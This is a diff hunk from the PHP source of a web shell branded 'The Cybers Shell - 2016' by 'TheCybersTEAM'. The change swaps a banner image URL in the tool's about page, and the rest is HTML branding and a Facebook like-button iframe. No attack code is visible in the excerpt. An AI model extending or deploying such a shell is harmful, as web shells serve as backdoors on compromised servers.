@@ -308,7 +308,7 @@ echo'</textarea></p><br><p align="center">
 
 if(isset($_GET['action']) && $_GET['action'] == 'abot'){
 echo '
-<br><center><img src="http://static.tumblr.com/c33a6eba385776f26555ba59f5fd54d2/cyncwgb/CENn1bfq6/tumblr_static_hacker_bot_new_tumblr_banner.jpg"></center><center>
+<br><center><img src="http://i.imgur.com/50bOEFV.png"></center><center>
 <span style="font-size:30px; font-family:Fredericka the Great; color:#009900">The Cybers Shell - 2016</span><br><font color="#008800" size="1pt">Created by </font><font  color="#00bb00" size="1pt">Offset And JonatasFil</font> <font color="#006600" size="1pt">-</font> <font color="#00bb00" size="1pt">TheCybersTEAM</font><br><br><br>
 <center><div class="logindiv"><table cellpadding="7" cellspacing="2">
 <center><br><iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/TheCybersTeam&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:350px; height:20px;" allowTransparency="true"></iframe></center></table></div></center><br></center>
